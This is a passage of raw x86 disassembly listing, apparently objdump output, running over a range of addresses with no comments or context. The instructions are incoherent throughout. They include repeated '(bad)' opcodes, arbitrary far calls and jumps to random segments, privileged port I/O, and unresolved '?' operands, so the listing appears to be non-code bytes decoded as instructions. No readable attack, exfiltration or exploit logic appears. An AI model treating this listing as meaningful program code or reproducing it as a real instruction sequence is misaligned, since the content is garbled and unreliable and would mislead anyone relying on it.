  419773:	test   BYTE PTR [edx+ebp*1-0x38],cl
  419777:	mov    bl,0x64
  419779:	sub    DWORD PTR [eax-0x2e],esi
  41977c:	cmp    dl,BYTE PTR [edi]
  41977e:	mov    eax,ds:0x72b928f6
  419783:	and    cl,BYTE PTR [eax-0x6346db8e]
  419789:	cmp    eax,0xe23b2d0a
  41978e:	mov    cs,WORD PTR ds:0xa52b451
  419794:	(bad)  
  419795:	fnsave [edx-0x3995adcb]
  41979b:	jg     0x41974b
  41979d:	dec    ecx
  41979e:	das    
  41979f:	int3   
  4197a0:	test   bh,ah
  4197a2:	dec    edx
  4197a3:	pop    ecx
  4197a4:	push   edi
  4197a5:	sahf   
  4197a6:	out    0xbb,al
  4197a8:	cmp    BYTE PTR [ebp-0x1c5e295d],ch
  4197ae:	bound  esi,QWORD PTR [ebp+0x1e]
  4197b1:	int3   
  4197b2:	push   ss
  4197b3:	xchg   ebp,eax
  4197b4:	push   esi
  4197b5:	test   DWORD PTR [ecx],ebp
  4197b7:	mov    dh,0x42
  4197b9:	sbb    DWORD PTR [ebx],esp
  4197bb:	cwde   
  4197bc:	cld    
  4197bd:	jle    0x4197a6
  4197bf:	adc    al,0xb3
  4197c1:	push   ebp
  4197c2:	cmp    BYTE PTR [edi+0x4363599f],bl
  4197c8:	dec    edi
  4197c9:	inc    esi
  4197ca:	loop   0x4197ab
  4197cc:	shl    DWORD PTR [esp+edx*2],0xa7
  4197d0:	mov    ds:0x540501c3,eax
  4197d5:	int3   
  4197d6:	pop    es
  4197d7:	call   0x36ee:0xe8059bd1
  4197de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197df:	xchg   esi,eax
  4197e0:	int3   
  4197e1:	gs retf 0x8cbe
  4197e5:	mov    es,WORD PTR [edi+esi*1]
  4197e8:	loopne 0x4197e2
  4197ea:	cs mov esp,0xdfd2b488
  4197f0:	xor    eax,0x186b9ea4
  4197f5:	mov    ?,WORD PTR [ecx+0x14aa3a7]
  4197fb:	out    dx,eax
  4197fc:	sub    eax,0xc5e33992
  419801:	inc    BYTE PTR [eax-0x16e64c8d]
  419807:	lea    esi,[ecx+0x2a6b5ee0]
  41980d:	or     DWORD PTR [esi+0x8],esp
  419810:	mov    BYTE PTR [edx],ah
  419812:	xchg   ebp,eax
  419813:	inc    esi
  419814:	adc    DWORD PTR [edx-0x20abeef2],ecx
  41981a:	mov    ecx,0x9f3842c4
  41981f:	stc    
  419820:	arpl   ax,cx
  419822:	xor    DWORD PTR [ebx+0x78e5806b],ecx
  419828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419829:	js     0x419879
  41982b:	sub    BYTE PTR [edx+ebx*1],dl
  41982e:	xchg   edi,eax
  41982f:	pop    esp
  419830:	in     eax,dx
  419831:	xlat   BYTE PTR ds:[ebx]
  419832:	pop    ss
  419833:	out    dx,al
  419834:	pop    ds
  419835:	sahf   
  419836:	lea    esp,[ebx+0x78]
  419839:	mov    dh,0x61
  41983b:	(bad)  
  41983c:	retf   0x8c1f
  41983f:	or     al,BYTE PTR [edx+0x303b1620]
  419845:	cld    
  419846:	jbe    0x419822
  419848:	sbb    al,BYTE PTR [ecx-0x6]
  41984b:	in     eax,dx
  41984c:	cwde   
  41984d:	jp     0x4197fe
  41984f:	aam    0x20
  419851:	dec    ebx
  419852:	jnp    0x4197d9
  419854:	fdiv   DWORD PTR [eax+0x24]
  419857:	mov    esp,0xb16333a7
  41985c:	or     ebp,edx
  41985e:	out    dx,al
  41985f:	fild   DWORD PTR [eax-0x50cd8fe6]
  419865:	leave  
  419866:	arpl   si,dx
  419868:	mov    ds:0x6196de27,al
  41986d:	adc    eax,0xc685103a
  419872:	mov    al,ss:0x11e09d5e
  419878:	loopne 0x41981c
  41987a:	call   0xb498:0x439866cf
  419881:	sbb    ecx,ebx
  419883:	mov    eax,ds:0xffc5238
  419888:	pop    es
  419889:	(bad)  
  41988a:	shr    BYTE PTR [edi],1
  41988c:	and    dh,BYTE PTR [ebp-0x9]
  41988f:	pusha  
  419890:	test   BYTE PTR [edx],cl
  419892:	push   ss
  419893:	inc    edi
  419894:	mov    DWORD PTR [esi+0x7b],edx
  419897:	xchg   edx,eax
  419898:	push   es
  419899:	pop    ecx
  41989a:	inc    ecx
  41989b:	dec    esp
  41989c:	sar    BYTE PTR [ebx],cl
  41989e:	ret    0x800a
  4198a1:	call   0xcfd5:0x79525d28
  4198a8:	and    eax,DWORD PTR [edx+0x7e48fc83]
  4198ae:	sti    
  4198af:	cmp    ecx,DWORD PTR [ecx+edx*4+0x32]
  4198b3:	sbb    eax,0xca71d7db
  4198b8:	mov    bh,0xa8
  4198ba:	push   0x63ee5297
  4198bf:	imul   esp,DWORD PTR [esi+0x287a9101],0x77
  4198c6:	push   eax
  4198c7:	dec    esi
  4198c8:	outs   dx,BYTE PTR ds:[esi]
  4198c9:	xchg   esi,eax
  4198ca:	mov    dl,0xed
  4198cc:	and    ebx,DWORD PTR [ecx-0x68]
  4198cf:	popf   
  4198d0:	sub    al,0xc
  4198d2:	cmp    eax,0x2ead4fd3
  4198d7:	or     eax,0xa8eeaa0f
  4198dc:	push   ss
  4198dd:	(bad)  
  4198de:	rol    DWORD PTR [ecx+edi*8],1
  4198e1:	dec    ebx
  4198e2:	xor    esp,DWORD PTR ds:0xcd80722d
  4198e8:	and    ebp,ebx
  4198ea:	call   0x6a79:0xc0468b35
  4198f1:	jmp    0x4198b2
  4198f3:	pushf  
  4198f4:	fisubr WORD PTR [edi+0x62c11dab]
  4198fa:	(bad)  
  4198fb:	xchg   esi,eax
  4198fc:	or     al,0xd3
  4198fe:	test   DWORD PTR [esi],eax
  419900:	dec    edx
  419901:	js     0x419895
  419903:	mov    ds:0xa62fe5b6,eax
  419908:	and    BYTE PTR [ebx+0xb5aa5f6],ch
  41990e:	cdq    
  41990f:	fsubr  st,st(4)
  419911:	(bad)  
  419912:	xor    DWORD PTR [esi+0xe],ebp
  419915:	xchg   edx,eax
  419916:	imul   ecx,DWORD PTR [edx-0x70],0x165b87fe
  41991d:	into   
  41991e:	div    BYTE PTR [ebx]
  419920:	sub    esi,DWORD PTR [eax+0x4abe30e4]
  419926:	loop   0x419920
  419928:	mov    cl,BYTE PTR [edi+0x3fb5df1f]
  41992e:	push   esp
  41992f:	jmp    0x419952
  419931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419932:	push   ebx
  419933:	pop    ecx
  419934:	xchg   esi,eax
  419935:	sub    al,0x97
  419937:	ret    0x7e7
  41993a:	pop    eax
  41993b:	fisubr WORD PTR [esi-0x5]
  41993e:	add    ebp,DWORD PTR [edi+ebx*4-0x6367253d]
  419945:	inc    BYTE PTR [ebx-0x72e048f3]
  41994b:	jmp    0x41991e
  41994d:	dec    edi
  41994e:	pop    ebp
  41994f:	ins    BYTE PTR es:[edi],dx
  419950:	fnstenv [eax]
  419952:	add    ecx,DWORD PTR [eax-0x5e]
  419955:	cld    
  419956:	out    0x4b,al
  419958:	mov    ebp,0x7c04de60
  41995d:	repnz add edx,DWORD PTR [esi+edx*4+0x50]
  419962:	or     DWORD PTR [ecx+ebx*4-0x7dfacd54],ebp
  419969:	lds    ebx,FWORD PTR [esi]
  41996b:	in     eax,0x89
  41996d:	sti    
  41996e:	in     eax,dx
  41996f:	cmp    DWORD PTR [esp+ebp*2-0x75],esi
  419973:	pop    ds
  419974:	out    dx,eax
  419975:	inc    esp
  419976:	jns    0x4199c6
  419978:	ret    0xc31e
  41997b:	or     ebp,ecx
  41997d:	sub    eax,DWORD PTR [edi+0x43292e68]
  419983:	(bad)  
  419984:	lahf   
  419985:	out    dx,eax
  419986:	adc    edx,ebp
  419988:	cmc    
  419989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41998a:	push   ss
  41998b:	push   ecx
  41998c:	jecxz  0x41991d
  41998e:	jge    0x4199c7
  419990:	mov    edi,0xc18e96f8
  419995:	das    
  419996:	(bad)  
  419997:	fcom   DWORD PTR [esi]
  419999:	fstp   QWORD PTR [esi]
  41999b:	das    
  41999c:	dec    edi
  41999d:	mov    ebx,0xea25d918
  4199a2:	and    BYTE PTR [esi],bl
  4199a4:	push   ebx
  4199a5:	or     bh,BYTE PTR [ebx-0x1f73b117]
  4199ab:	jecxz  0x419977
  4199ad:	fisub  DWORD PTR [ebx+0x7c39e77c]
  4199b3:	xor    eax,0x88e8741b
  4199b8:	jmp    0x419946
  4199ba:	add    BYTE PTR [esi+0x20b1e440],ah
  4199c0:	or     bh,dh
  4199c2:	das    
  4199c3:	push   ebx
  4199c4:	xchg   BYTE PTR [esi+0xe],cl
  4199c7:	mov    al,BYTE PTR [edx+0x1a]
  4199ca:	test   edi,eax
  4199cc:	and    eax,0x59e185d3
  4199d1:	data16 xor ah,BYTE PTR [edi]
  4199d4:	sbb    ah,ch
  4199d6:	aam    0x46
  4199d8:	daa    
  4199d9:	mov    eax,ds:0x144b21ac
  4199de:	in     eax,0xc0
  4199e0:	cmp    al,0x5d
  4199e2:	mov    dl,dl
  4199e4:	mov    WORD PTR [ebx+eax*8-0x2f],fs
  4199e8:	dec    ebp
  4199e9:	push   ebx
  4199ea:	xchg   edx,eax
  4199eb:	test   esi,esi
  4199ed:	popf   
  4199ee:	imul   esp,esp,0x2251041e
  4199f4:	xlat   BYTE PTR ds:[ebx]
  4199f5:	inc    edi
  4199f6:	inc    ebx
  4199f7:	nop
  4199f8:	xor    eax,0x5f4a093b
  4199fd:	cmp    DWORD PTR [ebx-0x2e1d2547],ecx
  419a03:	xchg   esi,eax
  419a04:	push   ebx
  419a05:	pop    esi
  419a06:	sti    
  419a07:	or     al,0x55
  419a09:	lock fidiv DWORD PTR [eax+ebx*4+0x6e]
  419a0e:	mov    esp,0x229f4bf7
  419a13:	push   edi
  419a14:	ret    0xae3d
  419a17:	(bad)  
  419a1a:	dec    ebp
  419a1b:	dec    ecx
  419a1c:	repz mov edx,0xb579bea7
  419a22:	adc    ecx,DWORD PTR [edx]
  419a24:	xlat   BYTE PTR ds:[ebx]
  419a25:	sub    DWORD PTR [ecx-0x7cb95cd6],ebp
  419a2b:	jmp    0x9d36c851
  419a30:	(bad)  
  419a31:	jmp    0x7520:0x9be58b2d
  419a38:	add    DWORD PTR [edx-0x73],esi
  419a3b:	sbb    eax,0x52e09220
  419a40:	inc    edx
  419a41:	call   0x22cf136b
  419a46:	cmp    BYTE PTR [edx],bl
  419a48:	sbb    bl,bh
  419a4a:	sbb    eax,esi
  419a4c:	(bad)  
  419a4d:	clc    
  419a4e:	hlt    
  419a4f:	test   eax,0xeb8067b6
  419a54:	sbb    eax,0xb8bb5e45
  419a59:	mov    ah,0x3d
  419a5b:	cmp    ecx,DWORD PTR [esp+ebp*8+0x544ceede]
  419a62:	aas    
  419a63:	lea    edx,ds:0x22219a25
  419a69:	adc    eax,0x2b6aed96
  419a6e:	shr    bh,0x79
  419a71:	(bad)  
  419a72:	sbb    ecx,edi
  419a74:	test   al,0xb5
  419a76:	repnz add bh,0xb1
  419a7a:	aam    0x38
  419a7c:	in     al,dx
  419a7d:	data16 jecxz 0x419a5d
  419a80:	in     al,dx
  419a81:	inc    ecx
  419a82:	scas   eax,DWORD PTR es:[edi]
  419a83:	jne    0x419a93
  419a85:	bound  edi,QWORD PTR [edx+ebx*1]
  419a88:	mov    ds:0x9cb017c0,eax
  419a8d:	bound  ebp,QWORD PTR [esi]
  419a8f:	sbb    eax,0x5abaac43
  419a94:	sub    dl,dh
  419a96:	js     0x419a2e
  419a98:	sti    
  419a99:	and    ch,BYTE PTR [ebx+0x49]
  419a9c:	aam    0x50
  419a9e:	ret    0xdabc
  419aa1:	pop    esp
  419aa2:	pop    esi
  419aa3:	leave  
  419aa4:	cld    
  419aa5:	scas   al,BYTE PTR es:[edi]
  419aa6:	and    DWORD PTR [ebx],0x32f0baf1
  419aac:	fucomi st,st(4)
  419aae:	pop    es
  419aaf:	daa    
  419ab0:	scas   al,BYTE PTR es:[edi]
  419ab1:	(bad)  
  419ab2:	xor    al,0x1e
  419ab4:	scas   al,BYTE PTR es:[edi]
  419ab5:	dec    esp
  419ab6:	push   ebp
  419ab7:	sbb    dl,bh
  419ab9:	mov    ecx,0x99404821
  419abe:	(bad)  
  419abf:	fs or  al,0xda
  419ac2:	push   ecx
  419ac3:	push   esi
  419ac5:	jno    0x419ae4
  419ac7:	jbe    0x419b3d
  419ac9:	mov    esp,0x7340cf87
  419ace:	aaa    
  419acf:	mov    eax,ds:0xf86db54d
  419ad4:	fild   DWORD PTR [ecx-0x638173fe]
  419ada:	jns    0x419b03
  419adc:	dec    esp
  419add:	(bad)  
  419ade:	jo     0x419b54
  419ae0:	xchg   DWORD PTR [ecx-0x16],edi
  419ae3:	jge    0x419b2c
  419ae5:	(bad)  
  419ae7:	adc    DWORD PTR [ecx+0x54b5bed],0x28
  419aee:	icebp  
  419aef:	cvtps2pd xmm6,xmm0
  419af2:	adc    eax,0xcfb36adc
  419af7:	push   esi
  419af8:	mov    ecx,0x223980d2
  419afd:	fmul   DWORD PTR [edi-0x73]
  419b00:	pop    esi
  419b01:	adc    eax,0xe3b496cc
  419b06:	(bad)  
  419b07:	lock push esp
  419b09:	gs xchg ebx,eax
  419b0b:	xor    esi,DWORD PTR [edx-0x60]
  419b0e:	pop    esi
  419b0f:	mov    bl,0x27
  419b11:	adc    al,0xc
  419b13:	push   0xffffffa5
  419b15:	(bad)  
  419b16:	and    BYTE PTR [ecx+0x1b],ah
  419b19:	retf   0x779f
  419b1c:	dec    edi
  419b1d:	xchg   edi,eax
  419b1e:	xor    BYTE PTR [eax],cl
  419b20:	mov    dl,0xf9
  419b22:	cdq    
  419b23:	fiadd  WORD PTR [esp+ebp*2-0x77851f1a]
  419b2a:	sar    BYTE PTR [ebp+0x2a],1
  419b2d:	mov    edi,0x60968344
  419b32:	mov    bh,0xd7
  419b34:	xchg   edi,eax
  419b35:	ret    0xd055
  419b38:	push   esp
  419b39:	les    esp,FWORD PTR [esi+0x6f]
  419b3c:	adc    esi,DWORD PTR [ebx-0x4e]
  419b3f:	scas   al,BYTE PTR es:[edi]
  419b40:	xor    al,0x6d
  419b42:	pop    esi
  419b43:	xor    BYTE PTR [ecx+0x78],ch
  419b46:	adc    ch,0xf2
  419b49:	lahf   
  419b4a:	das    
  419b4b:	pop    edi
  419b4c:	bound  eax,QWORD PTR [ebx+0x6b]
  419b4f:	mov    dl,0xc
  419b51:	shl    DWORD PTR [edi+0x4be70113],0xd9
  419b58:	retf   0x3b4f
  419b5b:	xchg   ecx,eax
  419b5c:	inc    ebx
  419b5d:	cmp    BYTE PTR [eax+0x6461ed15],al
  419b63:	lea    ebx,[ecx-0x34]
  419b66:	cwde   
  419b67:	(bad)  
  419b68:	sti    
  419b69:	mov    ebx,0x218612c4
  419b6e:	mov    ebp,0x891a16c9
  419b73:	mov    al,0xd5
  419b75:	aam    0x42
  419b77:	out    0x26,eax
  419b79:	push   ds
  419b7a:	mov    ds:0x3ad7a11,eax
  419b80:	dec    ebp
  419b81:	and    al,0xd5
  419b83:	adc    DWORD PTR [esi+0x56abd47b],0xdf920e39
  419b8d:	jb     0x419b5f
  419b8f:	inc    eax
  419b90:	sub    DWORD PTR [ebp+0x61],ebp
  419b93:	test   al,0x12
  419b95:	xor    DWORD PTR [edi],eax
  419b97:	pop    edi
  419b98:	call   0x4e1b:0x46b4f829
  419b9f:	mov    ebp,0xa6e087b9
  419ba4:	push   edx
  419ba5:	aam    0x12
  419ba7:	imul   ecx,DWORD PTR [esi+0x2daf7d7d],0x8
  419bae:	repnz dec edx
  419bb0:	and    bl,BYTE PTR [ecx+0x8]
  419bb3:	fst    st(0)
  419bb5:	pop    esp
  419bb6:	lea    ebx,[edx+0x640695d9]
  419bbc:	addr16 ret 
  419bbe:	fcom   DWORD PTR [ecx+0x39]
  419bc1:	popa   
  419bc2:	mov    ebp,0xe26d6ad
  419bc7:	inc    esi
  419bc8:	ss push es
  419bca:	popa   
  419bcb:	sub    BYTE PTR ds:0x3abc5fc3,dh
  419bd1:	bound  esi,QWORD PTR [eax]
  419bd3:	in     eax,0x6a
  419bd5:	xchg   ch,cl
  419bd7:	fucomi st,st(7)
  419bd9:	cmc    
  419bda:	and    ch,ch
  419bdc:	lods   al,BYTE PTR ds:[esi]
  419bdd:	xchg   esi,eax
  419bde:	pop    edi
  419bdf:	jnp    0x419c43
  419be1:	les    edi,FWORD PTR [esi+0xef15685]
  419be7:	push   ds
  419be8:	call   0xda09711c
  419bed:	sub    BYTE PTR [esi-0x32bca756],ah
  419bf3:	shl    BYTE PTR [esi-0x70],0x9f
  419bf7:	xor    al,0x0
  419bf9:	xor    DWORD PTR ds:0xfb3e3503,eax
  419bff:	cmp    eax,0x4408083c
  419c04:	mov    al,BYTE PTR [edi+edx*8-0x27]
  419c08:	(bad)  
  419c09:	push   ss
  419c0a:	mov    ebx,0xa081e63e
  419c0f:	xchg   ebp,eax
  419c10:	lock shr DWORD PTR [di+0x50],0xf6
  419c16:	imul   esi,DWORD PTR [ebp+0x73],0x7d
  419c1a:	fmul   DWORD PTR [ebp+0x204b865c]
  419c20:	test   al,ah
  419c22:	pusha  
  419c23:	xchg   dl,dl
  419c25:	cld    
  419c26:	push   ebp
  419c27:	sar    BYTE PTR es:[ecx+0x65],cl
  419c2b:	clc    
  419c2c:	ins    BYTE PTR es:[edi],dx
  419c2d:	inc    eax
  419c2e:	push   ecx
  419c2f:	std    
  419c30:	mov    bl,0x1c
  419c32:	scas   al,BYTE PTR es:[edi]
  419c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c34:	pop    esp
  419c35:	mov    WORD PTR [ebx+0x69e10542],ds
  419c3b:	popf   
  419c3c:	sti    
  419c3d:	cld    
  419c3e:	nop
  419c3f:	icebp  
  419c40:	retf   0x4cdd
  419c43:	mov    eax,0xf8f6c80b
  419c48:	leave  
  419c49:	or     BYTE PTR fs:[ebx+0x67],ah
  419c4d:	es jb  0x419c7d
  419c50:	cdq    
  419c51:	(bad)  
  419c52:	sti    
  419c53:	sub    al,0x22
  419c55:	ss repnz (bad) 
  419c58:	mov    al,0xc1
  419c5a:	sub    eax,0x462d2f6f
  419c5f:	push   ss
  419c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c61:	mov    eax,0xd26de818
  419c66:	sti    
  419c67:	sbb    al,ah
  419c69:	inc    esi
  419c6a:	fbstp  TBYTE PTR [ebp+0x19]
  419c6d:	test   ah,al
  419c6f:	inc    esi
  419c70:	ins    DWORD PTR es:[edi],dx
  419c71:	xor    edi,ebp
  419c73:	out    0x2c,eax
  419c75:	jp     0x419cc8
  419c77:	cmp    BYTE PTR [edx-0x5d252d59],ah
  419c7d:	test   al,0x84
  419c7f:	mov    ds:0x6db0b047,eax
  419c84:	sahf   
  419c85:	pop    ss
  419c86:	imul   edi,DWORD PTR [ebx+0x4e802180],0xffffffb0
  419c8d:	mov    edi,0xa219dbc1
  419c92:	out    dx,eax
  419c93:	clc    
  419c94:	or     al,0x40
  419c96:	xor    cl,bl
  419c98:	cs or  al,0x24
  419c9b:	jl     0x419c58
  419c9d:	out    0x44,al
  419c9f:	cdq    
  419ca0:	repnz dec ebx
  419ca2:	sub    eax,0x12e69152
  419ca7:	repnz loop 0x419cb9
  419caa:	mov    bh,0x98
  419cac:	jmp    0x52e3bca2
  419cb1:	jge    0x419c6f
  419cb3:	(bad)  [eax-0x306943b7]
  419cb9:	cmp    bl,al
  419cbb:	ja     0x419cc8
  419cbd:	mov    BYTE PTR [esi],ah
  419cbf:	sar    DWORD PTR [ebx+0x169c9484],0x74
  419cc6:	dec    ebp
  419cc7:	test   BYTE PTR [eax+0x3f6f6180],cl
  419ccd:	stos   BYTE PTR es:[edi],al
  419cce:	xchg   DWORD PTR [esi],ecx
  419cd0:	mov    al,ds:0x1bd87bd7
  419cd5:	sbb    eax,0xb69bbef4
  419cda:	mov    esp,0xd6d3bc0c
  419cdf:	out    dx,al
  419ce0:	jns    0x419d51
  419ce2:	aad    0x98
  419ce4:	call   0xc66c2a41
  419ce9:	test   BYTE PTR ds:0x9a9f9053,ch
  419cef:	in     al,dx
  419cf0:	int3   
  419cf1:	cli    
  419cf2:	inc    esi
  419cf3:	mov    BYTE PTR ds:0x170c70b7,ah
  419cf9:	adc    ebp,DWORD PTR [eax]
  419cfb:	sti    
  419cfc:	xchg   esi,eax
  419cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cfe:	repz sub eax,0x5e622ec2
  419d04:	mov    bl,0x13
  419d06:	std    
  419d07:	ins    DWORD PTR es:[edi],dx
  419d08:	test   DWORD PTR [ebp+0x1aeb7a31],ecx
  419d0e:	sbb    BYTE PTR [edx],ah
  419d10:	inc    ebx
  419d11:	dec    edi
  419d12:	push   ebx
  419d13:	stos   BYTE PTR es:[edi],al
  419d14:	test   eax,0x6410b664
  419d19:	sub    al,0x9d
  419d1b:	pop    ecx
  419d1c:	pop    es
  419d1d:	repz mov dl,0x80
  419d20:	out    0x9c,al
  419d22:	pushf  
  419d23:	pop    esp
  419d24:	xchg   edi,eax
  419d25:	jg     0x419cb9
  419d27:	mov    eax,0xee41ff72
  419d2c:	mov    edx,?
  419d2e:	mov    edx,ecx
  419d30:	shl    BYTE PTR [ebp+0x5b2601b1],0xd8
  419d37:	icebp  
  419d38:	inc    esp
  419d39:	loope  0x419d3d
  419d3b:	cmp    al,bl
  419d3d:	(bad)  
  419d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3f:	(bad)  
  419d40:	sbb    DWORD PTR [edi+0x72],edx
  419d43:	outs   dx,DWORD PTR ds:[esi]
  419d44:	xchg   DWORD PTR [edi-0x4f],ebp
  419d47:	pop    ebp
  419d48:	xor    bl,BYTE PTR [esi]
  419d4a:	arpl   WORD PTR [edx-0xe],di
  419d4d:	shl    ebx,0x3c
  419d50:	push   0x6a
  419d52:	jae    0x419d8a
  419d54:	sub    BYTE PTR [ebx],cl
  419d56:	pop    ebp
  419d57:	fisttp QWORD PTR [ecx-0x1]
  419d5a:	out    0xce,al
  419d5c:	mov    ds:0x44e7a0b4,al
  419d61:	add    BYTE PTR [ebp+0x66ad6624],cl
  419d67:	pop    eax
  419d68:	or     al,0xcd
  419d6b:	or     al,0x1d
  419d6d:	call   0x8e2c:0x3def10c7
  419d74:	or     dl,BYTE PTR [ebx]
  419d76:	mov    WORD PTR [esi],cs
  419d78:	mov    esi,0x14a1a7fa
  419d7d:	inc    ecx
  419d7e:	jp     0x419d18
  419d80:	sub    eax,0x46068292
  419d85:	jge    0x419da7
  419d87:	pushf  
  419d88:	jge    0x419d17
  419d8a:	mov    eax,ds:0x1b3c8313
  419d8f:	mov    al,ds:0x921e6a22
  419d94:	popa   
  419d95:	mov    bl,0xff
  419d97:	in     eax,dx
  419d98:	sbb    BYTE PTR [ebx-0x5],dl
  419d9b:	retf   
  419d9c:	daa    
  419d9d:	lods   al,BYTE PTR ds:[esi]
  419d9e:	xchg   ebx,eax
  419d9f:	sub    al,0x14
  419da1:	cld    
  419da2:	xchg   esp,eax
  419da3:	push   eax
  419da4:	ss jnp 0x419d87
  419da7:	into   
  419da8:	ret    0x9bcb
  419dab:	push   ebp
  419dac:	mov    cl,0x40
  419dae:	dec    ebp
  419daf:	retf   0x8a3d
  419db2:	pop    ds
  419db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419db4:	test   BYTE PTR [eax-0xe],dh
  419db7:	lods   al,BYTE PTR ds:[esi]
  419db8:	jge    0x419db5
  419dba:	and    cl,BYTE PTR [eax-0x701b6d23]
  419dc0:	shl    DWORD PTR [edx-0x4b4a63f6],1
  419dc6:	in     al,dx
  419dc7:	cs push ebp
  419dc9:	fmul   DWORD PTR ds:[ebx]
  419dcc:	sub    al,0x5
  419dce:	fstp   TBYTE PTR [edx+0x6f1b4f8d]
  419dd4:	mov    esi,0x3e5881f7
  419dd9:	push   ds
  419dda:	xchg   esp,eax
  419ddb:	xchg   DWORD PTR ds:0x5879bef3,ecx
  419de1:	sbb    al,0x9c
  419de3:	jns    0x419e12
  419de5:	and    al,0x5b
  419de7:	sub    DWORD PTR [ebx-0x3ef48906],edi
  419ded:	dec    edx
  419dee:	fst    DWORD PTR [eax-0x1c]
  419df1:	sti    
  419df2:	(bad)  [edi-0x7d]
  419df5:	fcomip st,st(7)
  419df7:	and    al,0xa9
  419df9:	test   eax,eax
  419dfb:	leave  
  419dfc:	adc    al,0xb5
  419dfe:	mov    dh,ah
  419e00:	out    dx,al
  419e01:	mov    ecx,0xbee6dc84
  419e06:	aas    
  419e07:	xlat   BYTE PTR ds:[ebx]
  419e08:	pop    edx
  419e09:	test   eax,0x7f459387
  419e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e0f:	call   0x2cf0:0x3d5cf538
  419e16:	sbb    ebp,DWORD PTR [esi-0x52]
  419e19:	or     eax,0xf38ea13
  419e1e:	scas   al,BYTE PTR es:[edi]
  419e1f:	push   ecx
  419e20:	add    eax,0xa661a828
  419e25:	pop    eax
  419e26:	xchg   esp,eax
  419e27:	call   0xa2b5:0xfd31af4b
  419e2e:	adc    al,0x82
  419e30:	cmp    ebp,0x3f
  419e33:	mul    BYTE PTR [ebx+0x20d95b17]
  419e39:	fsubr  st(7),st
  419e3b:	fs ret 0x1da1
  419e3f:	das    
  419e40:	xchg   esp,esp
  419e42:	test   eax,0x5b51eb53
  419e47:	pop    ebx
  419e48:	sub    ebx,DWORD PTR ds:0x86edcea7
  419e4e:	sub    eax,0x315bf5c4
  419e53:	out    dx,eax
  419e54:	adc    DWORD PTR [edx],edi
  419e56:	and    bh,BYTE PTR [eax+0x49]
  419e59:	pushf  
  419e5a:	cmp    bl,bh
  419e5c:	push   edi
  419e5d:	jae    0x419dea
  419e5f:	in     al,dx
  419e60:	xor    eax,0xc44b8da5
  419e65:	std    
  419e66:	jle    0x419ea7
  419e68:	pop    ebp
  419e69:	out    0x19,al
  419e6b:	mov    al,ds:0xfe2248bf
  419e70:	push   es
  419e71:	pop    ds
  419e72:	call   0xa92d:0xb7cae416
  419e79:	repnz push ebx
  419e7b:	repnz push eax
  419e7d:	adc    al,0x35
  419e7f:	cld    
  419e80:	mov    al,0xb3
  419e82:	in     eax,0x85
  419e84:	lahf   
  419e85:	xchg   ch,ch
  419e87:	sbb    BYTE PTR [ebx-0x4a55fe16],bh
  419e8d:	pop    ebx
  419e8e:	inc    esp
  419e8f:	push   ecx
  419e90:	add    edx,DWORD PTR [eax-0x4f]
  419e93:	call   0xae28:0xb576df7a
  419e9a:	and    BYTE PTR [edi],bl
  419e9c:	and    DWORD PTR [ebp-0x7d6ffc8a],ecx
  419ea2:	mov    al,0xc7
  419ea4:	ss push ebx
  419ea6:	mov    ebp,ebx
  419ea8:	jmp    DWORD PTR [ebx+0x6bb12605]
  419eae:	inc    eax
  419eb0:	stc    
  419eb1:	das    
  419eb2:	dec    edx
  419eb3:	dec    edi
  419eb4:	cmp    al,0x62
  419eb7:	mov    dh,0x32
  419eb9:	adc    eax,0xc6bb3f3
  419ebe:	jne    0x419f34
  419ec0:	(bad)
  419ec4:	xchg   edi,eax
  419ec5:	mov    ch,0x4b
  419ec7:	loope  0x419ec9
  419ec9:	imul   esi,DWORD PTR [eax+0x3cdac37f],0x77f101df
  419ed3:	fs loop 0x419ed9
  419ed6:	push   es
  419ed7:	fcomp  st(6)
  419ed9:	popa   
  419eda:	sahf   
  419edb:	fistp  QWORD PTR [ecx+0xd]
  419ede:	mov    cl,0xb4
  419ee0:	dec    esp
  419ee1:	mov    WORD PTR [esi-0x4b7c8dd6],gs
  419ee7:	sti    
  419ee8:	enter  0xb9cb,0x81
  419eec:	daa    
  419eed:	lods   eax,DWORD PTR ds:[esi]
  419eee:	arpl   WORD PTR [edi+eax*2+0x62],bp
  419ef2:	adc    bl,BYTE PTR [edi]
  419ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ef5:	cmp    esi,ebx
  419ef7:	jno    0x419e89
  419ef9:	int    0xbf
  419efb:	(bad)  
  419efc:	std    
  419efd:	pop    ebp
  419efe:	xchg   ecx,eax
  419eff:	sub    eax,0xb3bf24cb
  419f04:	call   0x7948:0x38ba6306
  419f0b:	aam    0x7a
  419f0d:	dec    ebx
  419f0e:	xchg   DWORD PTR [eax+0x62173a29],ecx
  419f14:	out    0xa4,eax
  419f16:	mov    WORD PTR [eax],?
  419f18:	mov    ebx,0x63b9ffc3
  419f1d:	dec    eax
  419f1e:	retf   0xc487
  419f21:	inc    edx
  419f22:	mov    ch,0xd8
  419f24:	sar    BYTE PTR [edi],cl
  419f26:	aaa    
  419f27:	mov    ebp,esp
  419f29:	shl    ch,1
  419f2b:	xor    BYTE PTR [ebp-0x5],bh
  419f2e:	jne    0x419ef1
  419f30:	adc    eax,0x4cde00d3
  419f35:	xor    eax,0x41b0f20c
  419f3a:	mov    ch,dl
  419f3c:	mov    BYTE PTR [edi+0x4cddde60],dh
  419f42:	mov    dl,0xbb
  419f44:	pop    ecx
  419f45:	push   cs
  419f46:	imul   esp,DWORD PTR [ebp-0x2c],0x12f22793
  419f4d:	inc    ebp
  419f4e:	call   0x73d6:0x974d5e23
  419f55:	sbb    al,0x5e
  419f57:	xlat   BYTE PTR ds:[ebx]
  419f58:	jno    0x419f03
  419f5a:	rol    BYTE PTR [ebp+0x11099c60],0xde
  419f61:	enter  0x1f5,0xb2
  419f65:	call   0xc8:0xe00bd9cc
  419f6c:	ret    
  419f6d:	mov    DWORD PTR [edx+0x16],ebp
  419f70:	lods   eax,DWORD PTR ds:[esi]
  419f71:	sahf   
  419f72:	enter  0xdbfa,0x29
